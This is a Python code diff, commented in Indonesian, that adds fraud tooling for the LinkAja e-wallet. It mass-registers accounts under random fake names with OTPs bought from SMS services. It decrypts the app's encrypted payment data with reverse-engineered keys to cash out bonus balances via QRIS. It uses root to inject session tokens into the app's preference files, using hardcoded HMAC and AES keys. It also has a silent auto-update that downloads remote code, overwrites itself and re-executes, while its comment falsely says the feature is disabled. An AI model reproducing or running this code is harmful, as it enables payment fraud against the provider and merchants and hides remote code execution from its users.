+# ── helpers ──────────────────────────────────────────────────────────────
+def _sess(st):
+    return (st["ident"], st["shared"])
+
+
+def _st_of(sess):
+    return {"ident": sess[0], "shared": sess[1]}
+
+
+def _new_state(msisdn):
+    sess = key_agreement()
+    save_state(msisdn, sess)
+    return load_state(msisdn, max_age=365 * 86400)
+
+
+def _ensure_state(msisdn, sess):
+    save_state(msisdn, sess)
+    return _st_of(sess)
+
+
+class regis:
+    TNC = TNC
+    ENC_KEY = ENC_KEY
+    RegisError = RegisError
+    normalize_msisdn = staticmethod(normalize_msisdn)
+    step_check = staticmethod(step_check)
+    step_send_otp = staticmethod(step_send_otp)
+    step_validate = staticmethod(step_validate)
+    PrebuiltRegisterPayload = PrebuiltRegisterPayload
+    prepare_register_payload = staticmethod(prepare_register_payload)
+    execute_register_payload = staticmethod(execute_register_payload)
+    step_register = staticmethod(step_register)
+
+
+
+# ============================================================
+# MODUL INTEGRASI 7: QRIS CASHOUT ENGINE
+# ============================================================
+
+#!/usr/bin/env python3
+"""core/qris.py — Modul Payment & Cashout QRIS Dinamis/Statis LinkAja.
+
+Mendukung pembayaran menggunakan saldo bonus (bonbal), saldo utama, maupun
+penggabungan keduanya (split-payment).
+"""
+
+
+
+
+
+
+
+
+
+
+# VER already defined in session
+# BASE already defined in session
+# ENC_KEY already defined in regis
+
+
+# -------------------------------------------------------------
+# 1. EMV TLV PARSER & OFFLINE QR INSPECTION (ZERO-DEPENDENCY)
+# -------------------------------------------------------------
+def _crc16(data: str) -> int:
+    crc = 0xFFFF
+    for ch in data.encode("utf-8"):
+        crc ^= ch << 8
+        for _ in range(8):
+            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if crc & 0x8000 else (crc << 1) & 0xFFFF
+    return crc
+
+
+def emv_fields(raw: str) -> dict:
+    """Parse EMV TLV sequential dari awal string QR."""
+    out, i = {}, 0
+    while i + 4 <= len(raw):
+        try:
+            tag, ln = raw[i:i + 2], int(raw[i + 2:i + 4])
+        except ValueError:
+            break
+        val = raw[i + 4:i + 4 + ln]
+        if len(val) < ln:
+            break
+        out.setdefault(tag, val)
+        i += 4 + ln
+    return out
+
+
+def inspect_qr(raw: str) -> dict:
+    """Inspeksi offline format QRIS: validitas CRC, tipe dinamis/statis, merchant, dan nominal."""
+    raw = (raw or "").strip()
+    info = {"raw_len": len(raw), "ok": False}
+    if len(raw) < 20 or not raw.startswith("00"):
+        info["err"] = "Bukan format QRIS yang valid (Tag 00 tidak ditemukan)"
+        return info
+
+    crc_tag, body = raw[-4:], raw[:-4]
+    info["crc_ok"] = f"{_crc16(body):04X}".upper() == crc_tag.upper()
+    f = emv_fields(raw)
+    info["fields"] = f
+    info["merchant"] = (f.get("59") or f.get("58") or "Merchant").strip()
+    info["mcc"] = f.get("52")
+    info["currency"] = f.get("53")
+    info["poi_method"] = f.get("01")  # 02 = statis, 12 = dinamis
+    info["reference"] = f.get("62") or ""
+
+    amt54 = f.get("54")
+    if amt54:
+        try:
+            info["amount_tag54"] = float(int(amt54))
+        except ValueError:
+            info["amount_tag54"] = None
+    else:
+        info["amount_tag54"] = None
+
+    info["dynamic"] = bool(amt54)
+    info["ok"] = info["crc_ok"] and bool(f.get("26"))
+    return info
+
+
+# -------------------------------------------------------------
+# 2. SOF (SOURCE OF FUNDS) DECRYPTION (AES KEY2)
+# -------------------------------------------------------------
+def bonbal_pm(inq_data: dict, sess: tuple, rts: str) -> dict | None:
+    """Mendekripsi Source of Funds (SOF) LinkAja menggunakan Key2."""
+    ident, shared = sess
+    did, imsi = ident["deviceId"], ident["imsi"]
+    sof = None
+    for sec in (inq_data.get("detail") or []):
+        if sec.get("id") == 3:
+            for it in (sec.get("data") or []):
+                if (it.get("themes") or {}).get("style") == ["ENCRYPTED"]:
+                    sof = it.get("value")
+                    break
+    if not sof:
+        return None
+
+    k2 = shared.get("key2", "")
+    if len(k2) < 16:
+        return None
+
+    try:
+        blob = base64.b64decode(sof)
+    except Exception:
+        return None
+
+    if not blob or len(blob) % 16:
+        return None
+
+    n = len(k2)
+    gks = [df.get_key(k2, VER)]
+    gks += ["".join(k2[(off + i) % n] for i in range(16)) for off in range(n)]
+
+    _xr = lambda d, k: bytes(d[i] ^ k[i % len(k)] for i in range(len(d)))
+    _mask = lambda b: bytes(((x & 0x3f) << 2) & 0xff for x in b)
+
+    for gk in gks:
+        if not gk:
+            continue
+        key32 = _mask(_xr(imsi.encode() + gk.encode(), (did + rts).encode()))
+        iv = (_mask(_xr(rts.encode(), gk.encode())) + b"\x00" * 16)[:16]
+        try:
+            first = AES.new(key32, AES.MODE_CBC, iv).decrypt(blob[:16])
+        except Exception:
+            continue
+        if first[:1] not in (b"{", b"["):
+            continue
+        pt = AES.new(key32, AES.MODE_CBC, iv).decrypt(blob)
+        pad = pt[-1] if pt[-1] <= 16 else 0
+        try:
+            pms = json.loads(pt[:len(pt) - pad].decode())
+        except Exception:
+            continue
+
+        pms_list = pms if isinstance(pms, list) else [pms]
+        # Prioritas 1: Split payment yang ENABLED
+        for pm in pms_list:
+            if isinstance(pm, dict) and pm.get("isBonbal") and pm.get("isEnable", True):
+                return pm
+
+        # Prioritas 2: Reguler LinkAja yang ENABLED (code 09110)
+        for pm in pms_list:
+            if isinstance(pm, dict) and pm.get("code") == "09110" and pm.get("isEnable", True):
+                return pm
+
+        # Prioritas 3: Fallback sembarang isBonbal
+        for pm in pms_list:
+            if isinstance(pm, dict) and pm.get("isBonbal"):
+                return pm
+
+        # Prioritas 4: Fallback sembarang code 09110
+        for pm in pms_list:
+            if isinstance(pm, dict) and pm.get("code") == "09110":
+                return pm
+    return None
+
+
+# -------------------------------------------------------------
+# 3. QRIS API PIPELINE
+# -------------------------------------------------------------
+def qr_parse(sess: tuple, msisdn: str, raw_qr: str, jwt: str) -> dict | None:
+    """POST /transaction/qr/parse."""
+    ts = str(int(time.time() * 1000))
+    extra = {"x-koya-geheim": ts}
+    payload = {"input": raw_qr, "msisdn": msisdn}
+    token = f"Bearer {jwt}"
+    r = session.api_post(sess, "/transaction/qr/parse", payload, token=token, ts=ts, extra_headers=extra)
+    if r.status_code != 200:
+        return None
+    st = {"ident": sess[0], "shared": sess[1]}
+    j = session.decrypt_resp(r, st)
+    if j.get("status") != "00":
+        return None
+    return j.get("data", {})
+
+
+def qr_inquiry(sess: tuple, msisdn: str, parse_id: str, amount: float, jwt: str) -> tuple[dict | None, str, str]:
+    """POST /transaction/qr/inquiry. Return (inq_data, rts, err_msg)."""
+    ts = str(int(time.time() * 1000))
+    extra = {"x-koya-geheim": ts}
+    payload = {
+        "origin": msisdn,
+        "parseId": parse_id,
+        "tipId": None,
+        "amount": float(amount),
+        "isUseBonbal": True,
+        "promoCodes": []
+    }
+    token = f"Bearer {jwt}"
+    r = session.api_post(sess, "/transaction/qr/inquiry", payload, token=token, ts=ts, extra_headers=extra)
+    rts = r.headers.get("timestamp", "")
+    if r.status_code != 200:
+        return None, rts, f"HTTP Error {r.status_code}"
+    st = {"ident": sess[0], "shared": sess[1]}
+    j = session.decrypt_resp(r, st)
+    if j.get("status") != "00":
+        return None, rts, f"{j.get('status')} | {j.get('message', 'Inquiry ditolak')}"
+    return j.get("data", {}), rts, ""
+
+
+def qr_confirm(sess: tuple, msisdn: str, trx_id: str, pin: str, pm: dict, jwt: str) -> dict | None:
+    """POST /transaction/qr/confirm dengan PIN terenkripsi."""
+    ts = str(int(time.time() * 1000))
+    key32 = hashlib.sha256(ENC_KEY.encode()).hexdigest()[:32]
+    pin_enc = pin_crypto.encrypt_plain_text(pin, key32, ts)
+    payload = {
+        "transactionId": trx_id,
+        "code": pm.get("code", "09110"),
+        "bankCode": pm.get("bankCode", "09110"),
+        "cardId": pm.get("cardId", msisdn),
+        "sid": pm.get("sid", msisdn),
+        "pin": pin_enc
+    }
+    extra = {"x-koya-geheim": ts}
+    token = f"Bearer {jwt}"
+    r = session.api_post(sess, "/transaction/qr/confirm", payload, token=token, ts=ts, extra_headers=extra)
+    if r.status_code != 200:
+        return None
+    st = {"ident": sess[0], "shared": sess[1]}
+    j = session.decrypt_resp(r, st)
+    status_code = j.get("status")
+    if status_code in ("00", "60010011"):
+        return {
+            "success": True,
+            "status": status_code,
+            "pending": (status_code == "60010011"),
+            "message": j.get("message", "Sukses"),
+            "data": j.get("data", {})
+        }
+    return {
+        "success": False,
+        "status": status_code,
+        "message": j.get("message", "Konfirmasi ditolak"),
+        "data": j.get("data", {})
+    }
+
+
+# -------------------------------------------------------------
+# 4. HIGH-LEVEL EXECUTOR PER AKUN
+# -------------------------------------------------------------
+def check_account_balance(sess: tuple, jwt: str, st: dict) -> tuple[int, int]:
+    """Cek Saldo Utama dan Saldo Bonus secara live langsung dari server LinkAja."""
+    token = f"Bearer {jwt}"
+    saldo_utama = 0
+    bonus_poin = 0
+    try:
+        r_bal = session.api_get(sess, "/user/balance", token=token)
+        if r_bal.status_code == 200:
+            d_bal = session.decrypt_resp(r_bal, st)
+            raw_v = (d_bal.get("data") or {}).get("value", 0)
+            saldo_utama = int("".join(filter(str.isdigit, str(raw_v))) or 0)
+    except Exception:
+        pass
+
+    try:
+        r_pt = session.api_get(sess, "/user/point", token=token)
+        if r_pt.status_code == 200:
+            d_pt = session.decrypt_resp(r_pt, st)
+            raw_p = (d_pt.get("data") or {}).get("total", 0)
+            bonus_poin = int("".join(filter(str.isdigit, str(raw_p))) or 0)
+    except Exception:
+        pass
+
+    return saldo_utama, bonus_poin
+
+
+def pay_account_qris(state_file_path: str, raw_qr: str, pin_fallback: str = "888999", custom_amount: float = None) -> tuple[bool, str, dict]:
+    """Eksekusi pembayaran QRIS untuk 1 file state akun.
+    
+    Mendukung penggabungan Saldo Bonus + Saldo Utama secara otomatis.
+    Returns: (is_success: bool, status_msg: str, detail_dict: dict)
+    """
+    try:
+        with open(state_file_path, "r") as f:
+            st = json.load(f)
+    except Exception as e:
+        return False, f"Gagal membaca file state: {e}", {}
+
+    msisdn = st.get("msisdn")
+    jwt = st.get("jwt")
+    rt = st.get("refreshToken")
+    pin = st.get("pin") or pin_fallback
+
+    if not msisdn or not jwt:
+        return False, "Data akun tidak lengkap (msisdn atau jwt tidak ada)", {}
+
+    sess = (st["ident"], st["shared"])
+
+    # 1. Inspeksi format lokal
+    inspect = inspect_qr(raw_qr)
+    if not inspect["ok"]:
+        return False, f"Format QRIS tidak valid ({inspect.get('err', 'CRC Error')})", {}
+
+    # 2. Parse ke server LinkAja (auto refresh jika token expired)
+    parse_data = qr_parse(sess, msisdn, raw_qr, jwt)
+    if not parse_data and rt:
+        # Coba auto-refresh token
+        res_ref = session.api_post(sess, "/auth/session/refresh", {"token": jwt, "refreshToken": rt})
+        if res_ref.status_code == 200:
+            d_ref = session.decrypt_resp(res_ref, st)
+            if d_ref.get("status") == "00":
+                jwt = d_ref["data"]["token"]
+                rt = d_ref["data"].get("refreshToken", rt)
+                st["jwt"] = jwt
+                st["refreshToken"] = rt
+                with open(state_file_path, "w") as f:
+                    json.dump(st, f, indent=2, ensure_ascii=False)
+                parse_data = qr_parse(sess, msisdn, raw_qr, jwt)
+
+    if not parse_data or not parse_data.get("parseId"):
+        return False, "Parse QRIS ke server LinkAja gagal (QR kadaluarsa atau tidak aktif)", {}
+
+    parse_id = parse_data["parseId"]
+    merchant_name = parse_data.get("merchantName") or inspect.get("merchant") or "Merchant"
+    srv_amount = parse_data.get("amount")
+
+    # Nominal yang akan dibayar: custom > server parse > tag54
+    nominal = custom_amount or srv_amount or inspect.get("amount_tag54")
+    if not nominal or nominal <= 0:
+        return False, "Nominal transaksi tidak terdeteksi (Gunakan QR Dinamis yang ber-nominal)", {}
+
+    nominal = float(nominal)
+
+    # 3. Inquiry Transaksi (isUseBonbal: True)
+    inq_data, rts, err = qr_inquiry(sess, msisdn, parse_id, nominal, jwt)
+    if not inq_data:
+        return False, f"Inquiry gagal: {err}", {"merchant": merchant_name, "nominal": nominal}
+
+    trx_id = inq_data.get("transactionId")
+    if not trx_id:
+        return False, "Tidak mendapatkan transactionId dari server", {}
+
+    # 4. Dekripsi Source of Funds (SOF)
+    pm = bonbal_pm(inq_data, sess, rts)
+    if not pm:
+        return False, "Gagal mendekripsi metode pembayaran / SOF akun", {}
+
+    # Validasi gabungan Saldo Bonus + Saldo Utama (LinkAja menyimpan saldo utama di 'limitAmount')
+    bonbal = float(pm.get("bonbal") or 0)
+    balance = float(pm.get("limitAmount") or pm.get("balance") or 0)
+    total_daya_beli = bonbal + balance
+
+    if total_daya_beli < nominal:
+        return False, (
+            f"Saldo tidak cukup (Butuh: Rp {int(nominal):,} | "
+            f"Tersedia: Rp {int(total_daya_beli):,} [Bonus: Rp {int(bonbal):,} + Utama: Rp {int(balance):,}])"
+        ), {"merchant": merchant_name, "nominal": nominal, "bonbal": bonbal, "balance": balance}
+
+    # 5. Konfirmasi Pembayaran
+    conf = qr_confirm(sess, msisdn, trx_id, pin, pm, jwt)
+    if not conf or not conf.get("success"):
+        msg = conf.get("message", "Konfirmasi ditolak server") if conf else "Gagal konfirmasi pembayaran"
+        return False, msg, {"merchant": merchant_name, "nominal": nominal}
+
+    # 6. Verifikasi Saldo Real-Time (Anti-Transaksi Gantung di Switch LinkAja)
+    expected_bonbal_used = min(bonbal, nominal)
+    expected_balance_used = max(0.0, nominal - bonbal)
+
+    # Jeda 1.5 detik agar database core LinkAja & switch merampungkan pencatatan ledger
+    time.sleep(1.5)
+    saldo_after, bonus_after = check_account_balance(sess, jwt, st)
+
+    # Jika saldo utama seharusnya berkurang tapi masih utuh, polling verifikasi hingga 2 kali lagi
+    if expected_balance_used > 0 and saldo_after >= balance:
+        for _ in range(2):
+            time.sleep(1.5)
+            saldo_after, bonus_after = check_account_balance(sess, jwt, st)
+            if saldo_after < balance:
+                break
+
+    actual_balance_deducted = max(0.0, balance - saldo_after)
+    actual_bonbal_deducted = max(0.0, bonbal - bonus_after)
+
+    # DETEKSI ANOMALI: Saldo utama tidak terpotong sama sekali padahal nominal butuh saldo utama
+    if expected_balance_used > 0 and actual_balance_deducted < (expected_balance_used * 0.8):
+        status_code = conf.get("status", "60010011")
+        err_msg = (
+            f"Transaksi Gantung di Switch LinkAja ({status_code})! "
+            f"Saldo Utama BELUM terpotong (masih Rp {int(saldo_after):,}) dan uang belum masuk merchant."
+        )
+        return False, err_msg, {
+            "merchant": merchant_name,
+            "nominal": nominal,
+            "transactionId": trx_id,
+            "gantung": True,
+            "saldo_utama_sisa": saldo_after,
+            "bonus_sisa": bonus_after,
+            "bonbal_used": actual_bonbal_deducted,
+            "balance_used": actual_balance_deducted
+        }
+
+    return True, conf.get("message", "Sukses (Terkonfirmasi)"), {
+        "merchant": merchant_name,
+        "nominal": nominal,
+        "transactionId": trx_id,
+        "pending": False,
+        "bonbal_used": actual_bonbal_deducted if actual_bonbal_deducted > 0 else expected_bonbal_used,
+        "balance_used": actual_balance_deducted if actual_balance_deducted > 0 else expected_balance_used
+    }
+
+
+class qris:
+    inspect_qr = staticmethod(inspect_qr)
+    pay_account_qris = staticmethod(pay_account_qris)
+    qr_parse = staticmethod(qr_parse)
+    qr_inquiry = staticmethod(qr_inquiry)
+    qr_confirm = staticmethod(qr_confirm)
+    check_account_balance = staticmethod(check_account_balance)
+
+
+
+# ============================================================
+# LOGIKA APLIKASI UTAMA (BOT WAR ENGINE)
+# ============================================================
+
+# KONFIGURASI AUTO-UPDATE SENYAP
+# ==========================================
+# Dikosongkan agar tidak melakukan auto-update
+GITHUB_RAW_URL = "https://raw.githubusercontent.com/canntona/gurih/refs/heads/main/bot.py"
+
+def auto_update():
+    """Mengecek pembaruan script ke GitHub. Jika ada versi baru, otomatis update & restart."""
+    if not GITHUB_RAW_URL.strip():
+        return
+    try:
+        req = urllib.request.Request(GITHUB_RAW_URL, headers={'User-Agent': 'Mozilla/5.0', 'Cache-Control': 'no-cache'})
+        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=5) as response:
+            remote_code = response.read().decode('utf-8')
+
+        with open(__file__, "r", encoding="utf-8") as f:
+            local_code = f.read()
+
+        if remote_code.strip() and remote_code.strip() != local_code.strip():
+            console.print("\n[bold bright_yellow][!] Memperbarui sistem ke versi terbaru dari GitHub...[/bold bright_yellow]")
+            with open(__file__, "w", encoding="utf-8") as f:
+                f.write(remote_code)
+            time.sleep(1)
+            os.execv(sys.executable, ['python'] + sys.argv)
+    except Exception:
+        # Senyap jika offline atau gagal koneksi
+        pass
+
+# ==========================================
+# UTILITAS LAYAR & HEADER (ANTI-OVERLAP)
+# ==========================================
+def clear_once():
+    """Mengosongkan buffer layar sepenuhnya di Windows (cls) maupun Linux/Termux (clear)."""
+    os.system("cls" if os.name == "nt" else "clear")
+    sys.stdout.flush()
+
+def print_section_header(title: str, subtitle: str = "", style: str = "bright_cyan"):
+    clear_once()
+    content = f"[bold {style}]{title}[/]"
+    if subtitle:
+        content += f"\n[dim]{subtitle}[/]"
+    console.print(Panel(content, border_style=style, box=box.ROUNDED, padding=(0, 2)))
+
+# ==========================================
+# FUNGSI LOAD API KEY
+# ==========================================
+def load_api_key():
+    api_file = "api.txt"
+    if os.path.exists(api_file):
+        with open(api_file, "r") as f:
+            key = f.read().strip()
+            if key:
+                return key
+
+    clear_once()
+    console.print(
+        Panel(
+            "[bold yellow][!] API Key OTPInstan belum dikonfigurasi![/]\n"
+            "[dim]Masukkan API Key kamu untuk mengaktifkan layanan OTP otomatis.[/]",
+            title="[bold cyan]Konfigurasi Awal[/]",
+            border_style="bright_yellow",
+            box=box.ROUNDED,
+            width=65,
+        )
+    )
+    new_key = Prompt.ask("[bold cyan]>> Masukkan API Key OTPInstan[/]").strip()
+
+    with open(api_file, "w") as f:
+        f.write(new_key)
+
+    console.print("[bold green][OK] API Key berhasil disimpan ke api.txt![/]\n")
+    time.sleep(1)
+    return new_key
+
+# === KONFIGURASI API ===
+API_KEY_OTP = load_api_key()
+PIN_KUNCI = "888999"
+APP_VERSION = "4.46.1"
+BASE_LA_API = "https://avengers.linkaja.com/v2/api"
+
+# === KONFIGURASI TERMUX ROOT INJECT ===
+PACKAGE_LA = "com.telkom.mwallet"
+PREF_DIR_LA = f"/data/data/{PACKAGE_LA}/shared_prefs"
+PREF_HMAC_KEY_LA = b"HEY TAYOh3y T4y0"
+AES_IV_LA = b"HEY TAYOh3y T4y0"
+BACKUP_ROOT_LA = os.path.expanduser("~/inject_backup")
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+STATE_BACKUP_DIR = os.path.join(SCRIPT_DIR, "data", "states", "backup")
+
+FIRST_NAMES = [
+    "Aditya", "Agung", "Ahmad", "Aldi", "Ali", "Amir", "Andi", "Angga", "Anisa", "Aqilla",
+    "Ardi", "Arief", "Arya", "Aulia", "Bagus", "Bayu", "Bima", "Budi", "Cahya", "Candra",
+    "Chairul", "Chandra", "Citra", "Dandi", "Dani", "Darma", "Dedi", "Denny", "Desi", "Dewi",
+    "Dian", "Dimas", "Dina", "Dioni", "Doni", "Dwi", "Eko", "Eka", "Eko", "Fajar",
+    "Fauzi", "Febri", "Feri", "Fikri", "Firman", "Fitri", "Galih", "Gandi", "Gilang", "Hadi",
+    "Hafiz", "Hendra", "Heru", "Ihsan", "Ilham", "Imam", "Indra", "Intan", "Iqbal", "Irfan",
+    "Ismail", "Jaka", "Joko", "Joni", "Juli", "Kartika", "Kevin", "Kiki", "Krisna", "Kurniawan",
+    "Lestari", "Lia", "Lilis", "Lutfi", "Mahmud", "Marwan", "Maulana", "Mega", "Melati", "Miko",
+    "Mohammad", "Muhamad", "Muhammad", "Mulyadi", "Nanda", "Naufal", "Nia", "Niken", "Nina", "Novi",
+    "Nur", "Okta", "Pandu", "Putra", "Putri", "Rachmat", "Rahmat", "Raihan", "Raka", "Rama"
+]
+
+LAST_NAMES = [
+    "Pratama", "Saputra", "Kurniawan", "Nugroho", "Wibowo", "Santoso", "Hidayat", "Setiawan", "Maulana", "Ramadhan",
+    "Firmansyah", "Pangestu", "Kusuma", "Wijaya", "Susanto", "Permana", "Hakim", "Fauzi", "Gunawan", "Sanjaya",
+    "Rahmawan", "Irawan", "Hermawan", "Purnama", "Lesmana", "Hidayatullah", "Anugrah", "Budiman", "Cahyono", "Darmawan",
+    "Fadilah", "Gani", "Hartono", "Iskandar", "Jaya", "Kusnadi", "Lazuardi", "Mulyana", "Nasution", "Oktavian",
+    "Prakasa", "Qodir", "Rahardian", "Situmorang", "Tanjung", "Utomo", "Wahyudi", "Yulianto", "Zulkarnain", "Alamsyah",
+    "Arif", "Basuki", "Chaniago", "Damanik", "Effendi", "Fauzan", "Gultom", "Hrp", "Johan", "Kadir",
+    "Lubis", "Manurung", "Nasrullah", "Omar", "Pasaribu", "Qomar", "Rangkuti", "Siregar", "Tarigan", "Usman",
+    "Vebrian", "Wahid", "Yusuf", "Zainal", "Ahyar", "Bachtiar", "Cahyadi", "Dahlan", "Fathur", "Gozali",
+    "Hamzah", "Ilyas", "Jaelani", "Kamil", "Lukman", "Munir", "Nurdin", "Prasetyo", "Qosim", "Rasyid",
+    "Soleh", "Thohir", "Ubaidillah", "Vallen", "Wahab", "Yahya", "Zainudin", "Akbar", "Dzaky", "Faiz"
+]
+
+def generate_random_identity():
+    first = random.choice(FIRST_NAMES)
+    last = random.choice(LAST_NAMES)
+    rand_num = str(random.randint(1000, 9999))
+    return f"{first} {last}", f"{first.lower()}.{last.lower()}{rand_num}@gmail.com"
+
+# ==========================================
+# FUNGSI HELPER OTP MULTI-SERVER
+# ==========================================
+def batalkan_pesanan(base_s, srv, order_id):
+    if not order_id:
+        return
+    h = {"X-Api-Key": API_KEY_OTP}
+    try:
+        if srv == "1":
+            h["Content-Type"] = "application/json"
+            requests.post(f"{base_s}/cancel.php", headers=h, json={"order_id": order_id}, timeout=5)
+        else:
+            requests.post(f"{base_s}/cancel.php", headers=h, data={"order_id": order_id}, timeout=5)
+    except Exception:
+        pass
+
+def cek_status_otp(base_s, order_id):
+    try:
+        res = requests.get(
+            f"{base_s}/check.php",
+            params={"order_id": order_id},
+            headers={"X-Api-Key": API_KEY_OTP},
+            timeout=8
+        ).json()
+        d = res.get("data", res)
+        if isinstance(d, list) and len(d) > 0:
+            d = d[0]
+        if isinstance(d, dict):
+            raw = str(d.get("otp_code", d.get("otp", d.get("sms", ""))))
+            m = re.findall(r'\b\d{6}\b', raw)
+            return m[0] if m else "".join(filter(str.isdigit, raw))[:6]
+    except Exception:
+        pass
+    return None
+
+# ==========================================
+# FUNGSI HELPER SMSBOWER (SERVER 3)
+# ==========================================
+def load_smsbower_api_key():
+    api_file = "smsbower.txt"
+    if os.path.exists(api_file):
+        with open(api_file, "r", encoding="utf-8") as f:
+            key = f.read().strip()
+            if key:
+                return key
+
+    clear_once()
+    console.print(
+        Panel(
+            "[bold yellow][!] API Key SMSBower belum dikonfigurasi![/]\n"
+            "[dim]Kunci ini diperlukan untuk membeli nomor LinkAja otomatis via SMSBower.[/]",
+            title="[bold bright_yellow][*] SETUP API KEY SMSBOWER[/]",
+            border_style="bright_yellow",
+            box=box.ROUNDED,
+            expand=False,
+        )
+    )
+    new_key = Prompt.ask("[bold cyan]>> Masukkan API Key SMSBower[/]").strip()
+    with open(api_file, "w", encoding="utf-8") as f:
+        f.write(new_key)
+
+    console.print("[bold green][OK] API Key berhasil disimpan ke smsbower.txt![/]\n")
+    time.sleep(1)
+    return new_key
+
+def order_nomor_smsbower(api_key: str, max_price: float = 0.004):
+    try:
+        r = requests.get(
+            "https://smsbower.page/stubs/handler_api.php",
+            params={
+                "api_key": api_key,
+                "action": "getNumberV2",
+                "service": "aka",
+                "country": 6,
+                "maxPrice": str(max_price)
+            },
+            timeout=10
+        )
+        text = r.text.strip()
+        try:
+            j = r.json()
+            if isinstance(j, dict) and "phoneNumber" in j:
+                return str(j.get("activationId", "")), str(j.get("phoneNumber", ""))
+        except Exception:
+            pass
+
+        if "ACCESS_NUMBER:" in text:
+            parts = text.split(":")
+            if len(parts) >= 3:
+                return parts[1], parts[2]
+        return None, None
+    except Exception:
+        return None, None
+
+def cek_status_otp_smsbower(api_key: str, order_id: str):
+    try:
+        r = requests.get(
+            "https://smsbower.page/stubs/handler_api.php",
+            params={"api_key": api_key, "action": "getStatus", "id": order_id},
+            timeout=8
+        )
+        text = r.text.strip()
+        if text.startswith("STATUS_OK:"):
+            raw_c = text.split(":", 1)[1].strip()
+            m = re.findall(r'\b\d{6}\b', raw_c)
+            return m[0] if m else "".join(filter(str.isdigit, raw_c))[:6]
+    except Exception:
+        pass
+    return None
+
+def cancel_order_smsbower(api_key: str, order_id: str):
+    if not order_id:
+        return
+    try:
+        requests.get(
+            "https://smsbower.page/stubs/handler_api.php",
+            params={"api_key": api_key, "action": "setStatus", "status": 8, "id": order_id},
+            timeout=8
+        )
+    except Exception:
+        pass
+
+def finish_order_smsbower(api_key: str, order_id: str):
+    if not order_id:
+        return
+    try:
+        requests.get(
+            "https://smsbower.page/stubs/handler_api.php",
+            params={"api_key": api_key, "action": "setStatus", "status": 6, "id": order_id},
+            timeout=8
+        )
+    except Exception:
+        pass
+
+# ==========================================
+# ENGINE TERMUX ROOT INJECT (MODUL 5)
+# ==========================================
+class InjectError(Exception):
+    pass
+
+def termux_su(cmd: str, input_bytes: bytes = None, timeout: int = 60) -> str:
+    p = subprocess.run(["su", "-c", cmd], input=input_bytes, capture_output=True, timeout=timeout)
+    blob = p.stdout + p.stderr
+    if p.returncode != 0 or b"Permission denied" in blob or b"not found" in blob.lower()[:60]:
+        err = p.stderr.decode(errors="replace").strip()[:180] or blob.decode(errors="replace")[:180]
+        raise InjectError(f"su '{cmd[:50]}': {err}")
+    return p.stdout.decode(errors="replace").strip()
+
+def check_root_termux():
+    try:
+        out = termux_su("id -u")
+        if out.strip() != "0":
+            raise InjectError(f"su jalan tapi uid={out} — bukan root")
+    except FileNotFoundError:
+        raise InjectError("`su` gak ada — HP belum rooted / KernelSU gak kasih grant")
+    except subprocess.TimeoutExpired:
+        raise InjectError("su timeout — prompt grant mungkin belum di-approve")
+
+def pref_name_hash_la(name: str) -> str:
+    return hmac.new(PREF_HMAC_KEY_LA, name.encode(), hashlib.sha512).hexdigest()
+
+def _pref_key_la(keyname: str) -> bytes:
+    return keyname.encode().ljust(32, b"\x00")[:32]
+
+def pref_value_encrypt_la(keyname: str, plaintext: bytes) -> str:
+    c = AES.new(_pref_key_la(keyname), AES.MODE_CBC, AES_IV_LA)
+    n = 16 - len(plaintext) % 16
+    padded = plaintext + bytes([n]) * n
+    return c.encrypt(padded).hex().upper()
+
+def pref_value_decrypt_la(keyname: str, value_hex: str) -> bytes:
+    c = AES.new(_pref_key_la(keyname), AES.MODE_CBC, AES_IV_LA)
+    dec = c.decrypt(bytes.fromhex(value_hex))
+    return dec[:-dec[-1]]
+
+def load_prefs_xml_la(text: str) -> dict:
+    return dict(re.findall(r'<string name="([0-9a-f]+)">([^<]*)</string>', text))
+
+def dump_xml_la(store: dict, orig_text: str) -> str:
+    def repl(m):
+        h = m.group(1)
+        if h in store:
+            return f'<string name="{h}">{store[h]}</string>'
+        return m.group(0)
+    return re.sub(r'<string name="([0-9a-f]+)">[^<]*</string>', repl, orig_text)
+
+def _pull_xml_la(name: str) -> str:
+    return termux_su(f"cat {PREF_DIR_LA}/{name}")
+
+def _install_xml_la(name: str, xml_text: str):
+    termux_su(f"cat > {PREF_DIR_LA}/{name}", input_bytes=xml_text.encode())
+
+def _device_backup_once_la():
+    out = termux_su("ls /data/local/tmp/Core.xml.bak 2>/dev/null || echo NOPE")
+    if "Core.xml.bak" in out:
+        return
+    termux_su(f"cp {PREF_DIR_LA}/Core.xml /data/local/tmp/Core.xml.bak && cp {PREF_DIR_LA}/Security.xml /data/local/tmp/Security.xml.bak")
+    console.print("  [dim][+] Backup device pertama -> /data/local/tmp/*.bak[/]")
+
+def inject_termux_account(state_file_path: str):
+    t0 = time.time()
+    try:
+        with open(state_file_path, "r") as f:
+            st = json.load(f)
+        m, ident, shared = st.get("msisdn"), st.get("ident"), st.get("shared")
+        jwt, rt = st.get("jwt"), st.get("refreshToken")
+        if not (jwt and rt and ident and shared):
+            raise InjectError("State rusak atau belum selesai daftar (tidak ada token)")
+    except Exception as e:
+        raise InjectError(f"Gagal baca JSON: {e}")
+
+    with console.status("[bold magenta]Menjalankan proses Inject Root...[/]", spinner="line") as status:
+        status.update("[cyan][*] Memeriksa akses Root (Superuser)...[/]")
+        check_root_termux()
+        console.print("  [green][OK][/] Akses Root terverifikasi")
+
+        status.update("[cyan][*] Membaca konfigurasi XML aplikasi...[/]")
+        try:
+            core_xml = _pull_xml_la("Core.xml")
+            sec_xml = _pull_xml_la("Security.xml")
+        except InjectError as e:
+            raise InjectError(f"Gagal baca prefs app LinkAja (pastikan sudah pernah login sekali): {e}")
+
+        core, sec = load_prefs_xml_la(core_xml), load_prefs_xml_la(sec_xml)
+
+        token_json = json.dumps({"token": jwt, "refreshToken": rt}, separators=(",", ":"))
+        reps_core = {
+            "DEVICE_ID": ident["deviceId"],
+            "IMSI": ident["imsi"],
+            "ADS_ID": ident.get("adsId", ""),
+            "USER_PHONE_NUMBER": m,
+            "AUTHORIZATION_TOKEN": token_json,
+        }
+        reps_sec = {"keyX1": shared["key1"], "keyX2": shared["key2"], "keyX3": shared["key3"]}
+
+        for store, reps, fname in ((core, reps_core, "Core.xml"), (sec, reps_sec, "Security.xml")):
+            for name in reps:
+                if pref_name_hash_la(name) not in store:
+                    raise InjectError(f"Entry XML '{name}' tidak ketemu di {fname} — app LinkAja HP ini belum pernah login. Batal.")
+        console.print("  [green][OK][/] Struktur XML valid")
+
+        status.update("[cyan][*] Mencadangkan XML asli...[/]")
+        _device_backup_once_la()
